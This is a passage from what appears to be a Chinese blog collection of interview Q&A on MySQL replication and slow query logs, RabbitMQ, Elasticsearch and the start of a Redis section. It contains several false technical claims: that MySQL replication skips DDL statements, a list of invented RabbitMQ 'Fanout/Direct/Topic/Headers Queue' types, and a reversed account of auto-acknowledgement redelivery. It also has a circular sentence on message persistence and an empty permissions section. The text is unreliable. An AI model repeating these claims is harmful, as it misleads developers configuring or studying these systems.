中如何进行主从复制？</h3><p>MySQL主从复制是指将一个MySQL数据库实例的数据复制到另一个MySQL数据库实例的过程。其中，一个MySQL实例充当主服务器，另一个或多个实例充当从服务器。</p><p>主从复制的实现需要以下几个步骤：</p><ol><li>配置主服务器：首先，需要在主服务器上开启二进制日志（binary logging）功能，并配置一个唯一的服务器ID。这样，当有更新操作时，主服务器就会将更新操作记录到二进制日志中。</li><li>配置从服务器：从服务器需要配置与主服务器相同的MySQL版本，并配置一个唯一的服务器ID。然后，需要通过CHANGE MASTER TO命令告诉从服务器连接主服务器，并指定需要复制的二进制日志文件和位置。</li><li>启动复制进程：从服务器连接主服务器后，可以使用START SLAVE命令启动复制进程。从服务器将开始下载二进制日志并重放其中的更新操作。</li></ol><p>主从复制可以提高数据的可用性和可靠性，因为从服务器可以用于读取请求，而主服务器则负责写入数据。此外，当主服务器出现故障时，可以将从服务器提升为主服务器，从而继续提供服务。</p><p>要注意的是，主从复制只复制数据更改操作，并不复制表结构更改操作和其他DDL语句。此外，在复制过程中，可能会出现延迟现象，因为从服务器需要在接收到更新操作后才能执行。如果需要实时同步，可以使用MySQL的其他复制技术，如主主复制或环形复制。</p><h3 id="MySQL-中的慢查询日志是什么？如何开启和使用？"><a href="#MySQL-中的慢查询日志是什么？如何开启和使用？" class="headerlink" title="MySQL 中的慢查询日志是什么？如何开启和使用？"></a>MySQL 中的慢查询日志是什么？如何开启和使用？</h3><p>ySQL中的慢查询日志（Slow Query Log）是一种记录查询响应时间超过预设阈值的查询日志。通过分析慢查询日志，可以帮助我们了解查询性能问题，并进行优化。</p><p>要开启慢查询日志，需要在MySQL配置文件（my.cnf或my.ini）中设置slow_query_log选项，并指定一个慢查询日志文件的路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">makefileCopy code</span><br><span class="line">slow_query_log = 1</span><br><span class="line">slow_query_log_file = /path/to/slowquery.log</span><br><span class="line">long_query_time = 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>slow_query_log: 开启慢查询日志</li><li>slow_query_log_file: 慢查询日志文件路径</li><li>long_query_time: 定义慢查询的时间阈值，单位为秒，默认为10秒</li></ul><p>设置完毕后，重启MySQL服务使配置生效。</p><p>查询执行时间超过long_query_time的查询都会被记录到慢查询日志中。可以通过以下方法查看慢查询日志：</p><ol><li><p>通过命令行工具mysql执行以下命令查看慢查询日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlCopy code</span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;slow_query_log&#x27;;</span><br><span class="line">+----------------+-------+</span><br><span class="line">| Variable_name  | Value |</span><br><span class="line">+----------------+-------+</span><br><span class="line">| slow_query_log | ON    |</span><br><span class="line">+----------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;slow_query_log_file&#x27;;</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| Variable_name       | Value                             |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">| slow_query_log_file | /usr/local/mysql/data/slowquery.log |</span><br><span class="line">+---------------------+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT * FROM mysql.slow_log;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>直接查看慢查询日志文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellCopy code</span><br><span class="line">$ tail -f /path/to/slowquery.log</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>除了设置慢查询日志外，还可以通过使用EXPLAIN命令来分析查询执行计划，查看索引使用情况等信息，进一步优化查询性能。</p><h3 id="如何授权和撤销-MySQL-用户的权限？"><a href="#如何授权和撤销-MySQL-用户的权限？" class="headerlink" title="如何授权和撤销 MySQL 用户的权限？"></a>如何授权和撤销 MySQL 用户的权限？</h3><h3 id="—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————rabbitmq—————————————————————————————————————————————————</h3><h3 id="什么是-RabbitMQ？"><a href="#什么是-RabbitMQ？" class="headerlink" title="什么是 RabbitMQ？"></a>什么是 RabbitMQ？</h3><p>RabbitMQ是一个开源的消息代理（message broker），用于在应用程序之间传递数据。它使用AMQP（高级消息队列协议）作为消息传递的标准协议。RabbitMQ可以被用于许多不同的应用场景，例如解耦应用程序之间的通信、负载均衡、异步任务处理等等。</p><p>RabbitMQ的基本原理是：生产者（producer）将消息发送到RabbitMQ的交换机（exchange），然后交换机根据预定义的规则（例如路由键）将消息路由到队列（queue）中。消费者（consumer）订阅队列并从队列中接收消息。RabbitMQ提供了许多不同的交换机类型，例如直接交换机、主题交换机、头交换机等等，这些交换机类型可以根据实际需求进行选择。</p><p>在RabbitMQ中，消息传递的过程是异步的，这意味着生产者和消费者不需要同时在线。RabbitMQ提供了持久化机制，确保即使在消费者离线时，生产者发送的消息也不会丢失。此外，RabbitMQ还支持多个消费者同时从一个队列中消费消息，从而提高了系统的可扩展性和吞吐量。</p><h3 id="RabbitMQ-中的-Exchange-和-Queue-有什么作用？它们之间的关系是什么？"><a href="#RabbitMQ-中的-Exchange-和-Queue-有什么作用？它们之间的关系是什么？" class="headerlink" title="RabbitMQ 中的 Exchange 和 Queue 有什么作用？它们之间的关系是什么？"></a>RabbitMQ 中的 Exchange 和 Queue 有什么作用？它们之间的关系是什么？</h3><p>在 RabbitMQ 中，Exchange 和 Queue 是非常重要的概念，它们被用来实现消息的路由和传递。</p><p>Exchange 是消息的交换机，用于接收生产者发送的消息并将其路由到一个或多个与之绑定的 Queue 上。Exchange 有多种类型，包括 direct、fanout、topic 和 headers 等，每种类型都有不同的路由规则和应用场景。</p><p>Queue 是消息的缓存队列，用于存储接收到的消息，直到消费者获取并处理它们。Queue 可以绑定到一个或多个 Exchange 上，Exchange 将根据其类型和路由键将消息路由到 Queue 中，然后消费者可以从 Queue 中获取消息进行处理。</p><p>Exchange 和 Queue 之间的关系可以通过 Binding 进行定义，Binding 是一个关联 Exchange 和 Queue 的规则，它定义了 Exchange 将消息路由到哪个 Queue 上。Binding 可以指定一个或多个 routing key，用于确定消息应该路由到哪个 Queue 上。</p><p>因此，Exchange、Queue 和 Binding 是 RabbitMQ 中非常重要的概念，它们协同工作，实现了高效的消息传递和路由。</p><h3 id="RabbitMQ-中有哪些类型的-Exchange？"><a href="#RabbitMQ-中有哪些类型的-Exchange？" class="headerlink" title="RabbitMQ 中有哪些类型的 Exchange？"></a>RabbitMQ 中有哪些类型的 Exchange？</h3><p>在 RabbitMQ 中，Exchange 是消息路由的中心，负责接收来自生产者的消息并将其路由到一个或多个队列。Exchange 接收到消息后，需要将其路由到一个或多个队列，这是通过 Exchange 和 Queue 之间的绑定关系来实现的。Exchange 有四种类型：</p><ol><li>Direct Exchange（直接交换机）Direct Exchange 是 RabbitMQ 默认的交换机类型。当一个消息被发送到 Direct Exchange 时，会根据消息的 Routing Key（路由键）将消息路由到与之绑定的队列。</li><li>Fanout Exchange（扇形交换机）Fanout Exchange 将收到的所有消息广播到与之绑定的所有队列，不管消息的 Routing Key 是什么。</li><li>Topic Exchange（主题交换机）Topic Exchange 类似于 Direct Exchange，但允许使用通配符匹配 Routing Key。可以使用星号（*）匹配一个单词，或者使用井号（#）匹配多个单词。</li><li>Headers Exchange（头部交换机）Headers Exchange 根据消息的 Header（头部）属性进行路由，而不是根据 Routing Key。通常很少使用 Headers Exchange。</li></ol><h3 id="RabbitMQ-中有哪些类型的-Queue？"><a href="#RabbitMQ-中有哪些类型的-Queue？" class="headerlink" title="RabbitMQ 中有哪些类型的 Queue？"></a>RabbitMQ 中有哪些类型的 Queue？</h3><p>在 RabbitMQ 中，有以下几种类型的 Queue：</p><ol><li>Classic Queue：最基本的队列类型，可以在单个消息生产者和消费者之间传递消息。</li><li>Fanout Queue：可以将消息传递到多个消费者之间，它会将消息广播到所有与之绑定的队列。</li><li>Direct Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的路由键来决定将消息传递到哪些队列中。</li><li>Topic Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的路由键和通配符匹配规则来决定将消息传递到哪些队列中。</li><li>Headers Queue：可以将消息传递到一个或多个与之绑定的队列，它使用消息中的头部信息来决定将消息传递到哪些队列中。</li></ol><p>每种类型的队列都有其特定的用途和适用场景，开发者可以根据实际需求选择合适的队列类型来搭建 RabbitMQ 消息队列。</p><h3 id="RabbitMQ-中的消息是怎么发送的？"><a href="#RabbitMQ-中的消息是怎么发送的？" class="headerlink" title="RabbitMQ 中的消息是怎么发送的？"></a>RabbitMQ 中的消息是怎么发送的？</h3><p>在 RabbitMQ 中，消息的发送过程包括以下步骤：</p><ol><li>生产者创建一个连接到 RabbitMQ 服务器的通道（channel）。</li><li>生产者声明一个消息队列（queue），如果该队列不存在，则会自动创建一个新队列。</li><li>生产者将消息发送到该队列中。</li><li>RabbitMQ 将消息存储在该队列中，直到消费者从该队列中获取消息为止。</li><li>消费者创建一个连接到 RabbitMQ 服务器的通道。</li><li>消费者声明该队列，以便能够从该队列中获取消息。</li><li>消费者从该队列中获取消息并处理消息。</li></ol><p>在发送消息时，可以使用不同的交换机（exchange）类型来控制消息的路由行为。交换机决定了消息应该被发送到哪个队列，这个决策基于消息的路由键（routing key）和交换机类型。常见的交换机类型有：</p><ol><li>直接交换机（Direct exchange）：将消息路由到与消息的路由键完全匹配的队列中。</li><li>主题交换机（Topic exchange）：将消息路由到匹配通配符模式的队列中。</li><li>头交换机（Headers exchange）：将消息路由到满足指定头信息的队列中。</li><li>扇形交换机（Fanout exchange）：将消息路由到所有绑定到该交换机的队列中。</li></ol><p>在 RabbitMQ 中，生产者和消费者通过 AMQP（Advanced Message Queuing Protocol）协议进行通信，这是一种标准的消息传递协议，可用于消息队列系统的多种实现。</p><h3 id="RabbitMQ-中如何保证消息的可靠性？"><a href="#RabbitMQ-中如何保证消息的可靠性？" class="headerlink" title="RabbitMQ 中如何保证消息的可靠性？"></a>RabbitMQ 中如何保证消息的可靠性？</h3><p>RabbitMQ 通过多种机制来保证消息的可靠性：</p><ol><li>消息确认机制：在生产者发送消息时，可以开启消息确认机制。当 RabbitMQ 收到消息并将其存储在队列中后，会给生产者发送一个确认消息，表示消息已被成功存储。如果 RabbitMQ 无法将消息存储在队列中，则会给生产者发送一个拒绝消息。生产者可以在收到确认消息后才认为消息已经成功发送，从而避免消息丢失的情况。</li><li>消息持久化：当 RabbitMQ 收到消息后，会将消息存储在内存中，然后在必要时将其写入磁盘。如果 RabbitMQ 在将消息写入磁盘之前崩溃，那么消息就会丢失。为了避免这种情况，可以将队列和消息标记为持久化的，这样 RabbitMQ 就会在将消息存储在磁盘上之前将其存储在磁盘上，从而确保消息不会丢失。</li><li>消费者应答机制：在消费者接收到消息并处理完毕后，会给 RabbitMQ 发送一个确认消息，表示消息已被成功处理。如果消费者在处理消息时出现了错误或者崩溃，那么 RabbitMQ 就会将该消息重新发送给其他消费者，从而确保消息不会丢失。</li><li>消息重试机制：如果 RabbitMQ 发现某个消息无法被消费者处理，就会将该消息重新发送给其他消费者。在重新发送之前，RabbitMQ 会根据配置的重试策略进行多次重试。如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中，以便后续进行处理。</li></ol><p>通过以上机制的配合，RabbitMQ 能够有效地保证消息的可靠性，并避免消息丢失的情况。</p><h3 id="RabbitMQ-中如何处理消费者的异常退出？"><a href="#RabbitMQ-中如何处理消费者的异常退出？" class="headerlink" title="RabbitMQ 中如何处理消费者的异常退出？"></a>RabbitMQ 中如何处理消费者的异常退出？</h3><p>在 RabbitMQ 中，如果消费者出现异常退出，可以通过以下机制来处理：</p><ol><li>自动应答机制：如果消费者在处理消息时出现异常并崩溃，那么 RabbitMQ 就会将该消息重新发送给其他消费者，但是该消费者不会收到重新发送的消息。这是因为默认情况下，RabbitMQ 会将消息推送给消费者后自动确认，即自动发送一个确认消息给 RabbitMQ，表示该消息已被成功处理。如果消费者在处理消息时出现异常并崩溃，那么就无法发送确认消息，导致 RabbitMQ 认为该消息未被处理，从而将其重新发送给其他消费者。</li><li>手动应答机制：为了避免上述情况的发生，可以关闭自动应答机制，改为手动应答机制。在手动应答模式下，消费者必须在处理完消息后手动发送确认消息给 RabbitMQ，表示该消息已被成功处理。如果消费者在处理消息时出现异常并崩溃，那么就不会发送确认消息，从而导致 RabbitMQ 将该消息重新发送给其他消费者。另外，手动应答机制还可以设置消息的重新投递次数和重新投递间隔，以便控制消息的重试行为。</li><li>消息重试机制：如果消费者在处理消息时出现异常并崩溃，那么 RabbitMQ 会将该消息重新发送给其他消费者。在重新发送之前，RabbitMQ 会根据配置的重试策略进行多次重试。如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中，以便后续进行处理。</li></ol><p>通过以上机制的配合，RabbitMQ 能够有效地处理消费者的异常退出，避免消息丢失的情况</p><h3 id="RabbitMQ-中如何处理死信队列？"><a href="#RabbitMQ-中如何处理死信队列？" class="headerlink" title="RabbitMQ 中如何处理死信队列？"></a>RabbitMQ 中如何处理死信队列？</h3><p>在 RabbitMQ 中，如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中。为了处理死信队列，可以采取以下步骤：</p><ol><li>创建死信交换机和死信队列：首先需要创建一个死信交换机和一个死信队列。死信交换机用于接收被标记为死信的消息，并将其路由到死信队列中。死信队列用于存储死信消息，以便后续进行处理。</li><li>将队列绑定到死信交换机上：在创建普通队列时，需要将队列绑定到死信交换机上。这样，当消息被标记为死信时，就会被路由到死信队列中。</li><li>处理死信队列中的消息：在死信队列中的消息需要进行处理，可以采取以下几种方式：<ul><li>重新发送：将死信队列中的消息重新发送到原始队列中，让消费者重新尝试处理消息。</li><li>丢弃：直接从死信队列中删除消息。</li><li>转移：将死信队列中的消息转移到其他队列中，以便其他消费者处理。</li><li>记录日志：记录死信消息的信息，以便后续进行分析和处理。</li></ul></li></ol><p>通过以上步骤，可以有效地处理死信队列中的消息，提高消息的处理可靠性和稳定性。</p><h3 id="RabbitMQ-中如何实现延迟消息队列？"><a href="#RabbitMQ-中如何实现延迟消息队列？" class="headerlink" title="RabbitMQ 中如何实现延迟消息队列？"></a>RabbitMQ 中如何实现延迟消息队列？</h3><p>在 RabbitMQ 中，可以通过以下几种方式来实现延迟消息队列：</p><ol><li>使用 RabbitMQ 自带的插件：RabbitMQ 提供了一个名为“rabbitmq_delayed_message_exchange”的插件，可以用于实现延迟消息队列。该插件需要先安装和启用，然后创建一个带有该插件的延迟交换机，并将消息发送到该交换机上。在消息被路由到队列之前，可以通过消息头中的“x-delay”参数来指定消息的延迟时间，以实现延迟消息的发送。</li><li>使用 TTL 和死信队列：可以通过为消息设置TTL（Time To Live）属性，将其发送到一个带有死信队列的交换机上。当消息的TTL属性到期时，该消息会被发送到死信队列中，并且可以设置死信队列的TTL属性来实现延迟消息的发送。</li><li>使用定时器和延迟队列：可以使用定时器来定期检查消息队列中的消息，并将到期的消息发送到延迟队列中。在延迟队列中，可以为每个消息设置一个过期时间，并定期检查已过期的消息，将其发送到实际队列中。</li></ol><p>需要注意的是，以上方式都需要消费者能够及时地处理延迟消息，否则消息会一直停留在队列中，占用资源和空间。因此，在使用延迟消息队列时，需要仔细考虑消息的过期时间和消费者的处理能力，以确保系统的可靠性和稳定性。</p><h3 id="RabbitMQ-和-Kafka-有什么区别？"><a href="#RabbitMQ-和-Kafka-有什么区别？" class="headerlink" title="RabbitMQ 和 Kafka 有什么区别？"></a>RabbitMQ 和 Kafka 有什么区别？</h3><p>RabbitMQ 和 Kafka 都是常用的消息队列系统，它们有以下几个方面的不同：</p><ol><li>消息传递模型：RabbitMQ 是基于 AMQP 协议的消息队列系统，支持多种消息传递模式（如点对点、发布订阅、RPC等），适用于需要精确控制消息传递过程的场景。而 Kafka 则是一个分布式流式数据处理平台，支持消息发布订阅模式，适用于实时数据处理和分析场景。</li><li>性能和吞吐量：Kafka 在性能和吞吐量方面优于 RabbitMQ，因为 Kafka 的消息处理是基于批处理的，可以将多个消息一起处理，从而减少了网络传输和IO开销。而 RabbitMQ 需要使用者自己实现批处理。</li><li>可靠性和持久化：RabbitMQ 可以保证消息的可靠性和持久化，可以将消息写入磁盘，以便在出现故障时进行恢复。而 Kafka 也支持消息持久化，但在可靠性方面较 RabbitMQ 差一些，因为 Kafka 可能会出现消息丢失的情况。</li><li>部署和管理：RabbitMQ 的部署和管理相对简单，它可以通过简单的配置和管理界面进行部署和管理。而 Kafka 的部署和管理较为复杂，需要专门的管理和监控工具。</li></ol><p>总之，RabbitMQ 和 Kafka 适用于不同的场景。如果需要高性能、高吞吐量和实时数据处理能力，可以选择 Kafka；如果需要可靠性、持久化和灵活的消息传递模式，可以选择 RabbitMQ。</p><h3 id="—————————————————————————————————————————————————Es—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Es—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Es—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Es—————————————————————————————————————————————————</h3><h3 id="Elasticsearch和数据库对应的结构"><a href="#Elasticsearch和数据库对应的结构" class="headerlink" title="Elasticsearch和数据库对应的结构"></a>Elasticsearch和数据库对应的结构</h3><p>当我们在Elasticsearch中定义索引映射(mapping)时，我们需要指定每个字段的数据类型。下面是一些Elasticsearch字段类型和它们在关系型数据库中的对应关系：</p><ul><li>text：类似于关系型数据库中的VARCHAR或TEXT类型，用于存储长文本。</li><li>keyword：类似于关系型数据库中的CHAR或ENUM类型，用于存储短文本或关键字。</li><li>integer：类似于关系型数据库中的INTEGER或BIGINT类型，用于存储整数值。</li><li>float：类似于关系型数据库中的FLOAT或DOUBLE类型，用于存储浮点数值。</li><li>date：类似于关系型数据库中的DATE或TIMESTAMP类型，用于存储日期和时间。</li><li>boolean：类似于关系型数据库中的BOOLEAN类型，用于存储布尔值。</li></ul><p>需要注意的是，Elasticsearch是一个文档型数据库，它存储的是JSON格式的文档，因此与传统的关系型数据库有很大的不同。在Elasticsearch中，每个文档都有一个唯一的ID，并且可以包含多个字段。每个字段都可以定义不同的数据类型，以适应不同的用例。</p><h3 id="什么是-Elasticsearch？"><a href="#什么是-Elasticsearch？" class="headerlink" title="什么是 Elasticsearch？"></a>什么是 Elasticsearch？</h3><p>Elasticsearch是一个开源的全文搜索和分析引擎，它使用Lucene作为底层引擎，提供了一个分布式、多租户、可扩展的搜索平台。Elasticsearch是一个实时搜索和分析引擎，支持全文搜索、结构化搜索、地理空间搜索、指标聚合等多种功能。它可以帮助用户快速地从大量的数据中找到所需信息，是企业级应用中常用的搜索引擎之一。</p><h3 id="Elasticsearch-的主要特点有哪些？"><a href="#Elasticsearch-的主要特点有哪些？" class="headerlink" title="Elasticsearch 的主要特点有哪些？"></a>Elasticsearch 的主要特点有哪些？</h3><p>Elasticsearch 的主要特点包括：</p><ol><li>分布式：Elasticsearch 采用分布式架构，数据可以水平扩展到多台服务器上。</li><li>高可用：Elasticsearch 采用主从复制机制，数据在多个节点之间复制，可以确保数据的可靠性和高可用性。</li><li>全文搜索：Elasticsearch 支持对大量文本数据进行全文搜索和分词，并提供了丰富的搜索和过滤功能。</li><li>多语言支持：Elasticsearch 支持多种语言的全文搜索和分词，包括中文、日文、韩文等等。</li><li>实时性：Elasticsearch 能够实时索引和查询数据，查询响应速度快。</li><li>易用性：Elasticsearch 提供了简单易用的 RESTful API，使开发者可以轻松地与之交互。</li><li>可扩展性：Elasticsearch 提供了插件机制，可以根据实际需求进行扩展。</li><li>开源：Elasticsearch 是开源软件，社区支持活跃，拥有丰富的文档和教程。</li></ol><h3 id="Elasticsearch-中的倒排索引是什么？"><a href="#Elasticsearch-中的倒排索引是什么？" class="headerlink" title="Elasticsearch 中的倒排索引是什么？"></a>Elasticsearch 中的倒排索引是什么？</h3><p>Elasticsearch 中的倒排索引（Inverted Index）是指一种数据结构，它将每个文档中出现的每个词（Term）与该文档的对应位置建立关联。在传统的索引中，我们需要遍历每个文档，找到其中包含查询词的文档，然后再去检索该文档。而倒排索引则是直接根据查询词去查找包含该词的文档，而不必遍历每个文档。</p><p>举个例子，如果我们要查找一个包含词语 “Elasticsearch is a search engine” 的文档，传统的索引需要遍历每个文档才能找到该文档，而倒排索引则直接查找包含 “Elasticsearch”、”is”、”a”、”search”、”engine” 的文档，并返回相应的位置信息。</p><p>倒排索引的优点在于它可以提高搜索效率，并支持在大量文档中进行全文搜索。在 Elasticsearch 中，倒排索引是一个核心概念，它被用于存储和搜索文档中的所有词汇信息。</p><h3 id="Elasticsearch-如何实现分布式搜索和聚合？"><a href="#Elasticsearch-如何实现分布式搜索和聚合？" class="headerlink" title="Elasticsearch 如何实现分布式搜索和聚合？"></a>Elasticsearch 如何实现分布式搜索和聚合？</h3><p>Elasticsearch 使用分布式架构来实现搜索和聚合。具体来说，它使用了以下几个机制来实现：</p><ol><li>分片：Elasticsearch 将索引分成多个片段，并将这些片段分配给不同的节点。这样可以将数据分散存储在不同的节点上，从而提高了性能和可伸缩性。</li><li>副本：Elasticsearch 可以将分片复制到不同的节点上，以提高数据的可用性和容错性。当主分片不可用时，副本分片可以被提升为主分片。</li><li>路由：当一个查询被发出时，Elasticsearch 会将查询路由到适当的分片。这通常涉及到将查询分发到所有分片，然后对结果进行汇总。</li><li>聚合：Elasticsearch 支持对分布式数据进行聚合计算，例如平均值、总和、最小值和最大值。它使用 MapReduce 的思想来实现分布式聚合。</li></ol><h3 id="Elasticsearch-中的集群是如何工作的？"><a href="#Elasticsearch-中的集群是如何工作的？" class="headerlink" title="Elasticsearch 中的集群是如何工作的？"></a>Elasticsearch 中的集群是如何工作的？</h3><p>Elasticsearch集群是由多个节点组成的，每个节点是一个单独的Elasticsearch实例。每个节点都可以处理数据，执行搜索和聚合操作，并维护自己的本地副本。集群中的每个节点都有自己的唯一名称，并且知道其他节点的名称和IP地址。</p><p>当一个请求到达Elasticsearch集群时，它会被发送到一个称为协调节点的节点。协调节点负责协调请求并将请求路由到适当的节点。协调节点维护一个集群状态，并跟踪哪些分片分配给了哪些节点。</p><p>当一个文档被索引时，它被分成若干个分片，然后分配给不同的节点进行处理。每个分片都有自己的副本，副本可以保证在节点故障时数据不会丢失。</p><p>在搜索和聚合操作中，请求被发送到协调节点。协调节点将请求路由到涉及到的所有分片，然后将结果汇总到单个响应中。这种方式使得Elasticsearch能够快速地进行分布式搜索和聚合操作，并支持大规模数据处理。</p><h3 id="Elasticsearch-中的索引是如何管理的？"><a href="#Elasticsearch-中的索引是如何管理的？" class="headerlink" title="Elasticsearch 中的索引是如何管理的？"></a>Elasticsearch 中的索引是如何管理的？</h3><p>在 Elasticsearch 中，索引用于组织和存储数据，类似于关系型数据库中的表。索引由一个或多个分片组成，每个分片都是一个 Lucene 索引。当一个文档被索引时，它会被分成多个分片，并分配给不同的节点进行处理。这样可以使得 Elasticsearch 在大规模数据量下仍然能够快速进行搜索和聚合操作。</p><p>在 Elasticsearch 中，索引的管理主要涉及以下方面：</p><ol><li>创建索引：可以通过 Elasticsearch 提供的 REST API 或者使用 Elasticsearch 客户端库来创建索引。</li><li>映射管理：在索引中定义文档的结构和字段类型。可以通过映射管理来指定文本字段使用的分词器、日期字段使用的日期格式等等。</li><li>索引别名管理：可以为一个索引创建多个别名，便于搜索和管理。</li><li>索引设置管理：包括索引的分片和副本数、分词器、过滤器等等。</li><li>索引优化：包括合并分段、刷新缓存、重建索引等操作，可以提高搜索和聚合的性能。</li></ol><p>总之，索引是 Elasticsearch 中最重要的组成部分之一，索引的管理可以对 Elasticsearch 的性能、可扩展性和可维护性产生重大影响。</p><h3 id="Elasticsearch-中如何实现数据备份和恢复？"><a href="#Elasticsearch-中如何实现数据备份和恢复？" class="headerlink" title="Elasticsearch 中如何实现数据备份和恢复？"></a>Elasticsearch 中如何实现数据备份和恢复？</h3><p>在Elasticsearch中，可以使用快照和恢复机制来进行数据备份和恢复。</p><p>快照是对整个集群或者单个索引的拍摄，包括所有的分片和副本，以及索引元数据和设置。可以将快照存储在本地磁盘上，也可以将其存储在远程共享文件系统上。快照可以使用Elasticsearch的API手动创建，也可以设置定时任务进行自动创建。</p><p>当需要恢复数据时，可以使用快照进行恢复。可以选择将整个集群或者单个索引恢复到之前拍摄的快照中的某个时间点。在恢复过程中，Elasticsearch会自动创建索引，并将分片和副本分配到可用的节点上。</p><p>值得注意的是，进行快照和恢复操作需要确保版本的兼容性。即快照和恢复的版本应该一致，否则可能会导致数据无法恢复或者出现其他问题。</p><h3 id="Elasticsearch-中如何处理查询性能问题？"><a href="#Elasticsearch-中如何处理查询性能问题？" class="headerlink" title="Elasticsearch 中如何处理查询性能问题？"></a>Elasticsearch 中如何处理查询性能问题？</h3><p>在 Elasticsearch 中，处理查询性能问题的一般步骤包括以下几点：</p><ol><li>优化查询语句：在编写查询语句时，应该尽量避免使用过于复杂的查询，可以采用缓存查询结果、复用查询等技术来减少查询的复杂度和耗时。</li><li>使用索引优化查询：使用合适的索引可以大大提升查询的性能。在 Elasticsearch 中，可以通过控制索引的数量、大小和分片等参数来优化查询性能。另外，使用合适的查询语法和查询参数也能够提高查询的效率。</li><li>调整硬件配置：对于大规模数据处理的场景，调整硬件配置可以有效提高查询性能。可以考虑增加服务器数量、扩容磁盘容量、增加内存容量等。</li><li>避免过度使用聚合操作：在 Elasticsearch 中，聚合操作是非常耗时的，尤其是在处理大数据量的情况下。因此，应该尽量避免过度使用聚合操作。</li><li>使用分布式搜索：Elasticsearch 支持分布式搜索，可以将搜索请求分散到多个节点上处理，从而提高搜索性能。如果数据量很大，可以考虑将索引分片，以便并行处理查询请求。</li></ol><p>综上所述，通过优化查询语句、使用索引、调整硬件配置、避免过度使用聚合操作和使用分布式搜索等方法，可以有效提高 Elasticsearch 的查询性能。</p><h3 id="Elasticsearch-中如何进行集群监控和管理？"><a href="#Elasticsearch-中如何进行集群监控和管理？" class="headerlink" title="Elasticsearch 中如何进行集群监控和管理？"></a>Elasticsearch 中如何进行集群监控和管理？</h3><p>Elasticsearch 提供了一系列工具和机制来监控和管理集群的健康状态和性能表现。</p><p>以下是一些常用的工具和机制：</p><ol><li>Elasticsearch Head 插件：这是一个基于 Web 的 Elasticsearch 集群管理工具，它提供了一个可视化界面，用于监控集群的健康状态、索引和节点信息等。</li><li>Kibana：这是一个基于 Web 的数据分析和可视化平台，它可以与 Elasticsearch 集成，用于实时监控和可视化 Elasticsearch 集群中的数据。</li><li>Elasticsearch 的 API：Elasticsearch 提供了一系列 RESTful API，可以用于管理和监控集群。例如，可以使用 _cluster/health API 获取集群的健康状态，使用 _cat API 获取节点和索引的统计信息等。</li><li>X-Pack：这是 Elasticsearch 官方提供的商业版插件，它提供了许多额外的功能，例如安全性、警报、监控、报告和机器学习等。</li><li>第三方监控工具：还可以使用一些第三方监控工具，例如 Prometheus 和 Grafana 等，它们可以通过 Elasticsearch 的 API 来监控 Elasticsearch 集群的状态和性能。</li></ol><p>总之，Elasticsearch 提供了多种方式来监控和管理集群的健康状态和性能表现。根据实际情况选择合适的工具和机制，可以更好地管理和维护 Elasticsearch 集群。</p><h3 id="Elasticsearch-与传统数据库的区别是什么？"><a href="#Elasticsearch-与传统数据库的区别是什么？" class="headerlink" title="Elasticsearch 与传统数据库的区别是什么？"></a>Elasticsearch 与传统数据库的区别是什么？</h3><p>Elasticsearch 和传统数据库在设计思路、数据存储方式、查询性能、数据分析等方面存在很大的区别。</p><ol><li>设计思路：Elasticsearch 是基于分布式搜索引擎 Lucene 构建的分布式搜索引擎，旨在快速、准确地进行全文搜索和实时数据分析。传统数据库则更加注重数据的事务性和一致性，面向业务应用。</li><li>数据存储方式：Elasticsearch 采用文档式存储方式，将数据存储为 JSON 格式的文档，文档包含多个字段，每个字段都可以被索引和搜索。而传统数据库采用关系型模型，将数据存储在多个表中，需要进行关联查询。</li><li>查询性能：Elasticsearch 可以实现非常高效的全文搜索和聚合查询，支持分词、模糊匹配、多条件查询、过滤查询等复杂查询，而传统数据库的查询性能则主要受限于表结构、索引和数据量的大小。</li><li>数据分析：Elasticsearch 支持对实时数据进行实时分析，可以对海量数据进行快速聚合和分析，而传统数据库则需要进行离线的数据汇总和分析。</li></ol><p>综上所述，Elasticsearch 和传统数据库在数据存储方式、查询性能和数据分析等方面存在很大的差异，适用于不同的业务场景。</p><h3 id="—————————————————————————————————————————————————Redis—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Redis—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Redis—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Redis—————————————————————————————————————————————————</h3><h3 id="什么是-Redis？Redis-的优点和缺点是什么？"><a href="#什么是-Redis？Redis-的优点和缺点是什么？" class="headerlink" title="什么是 Redis？Redis 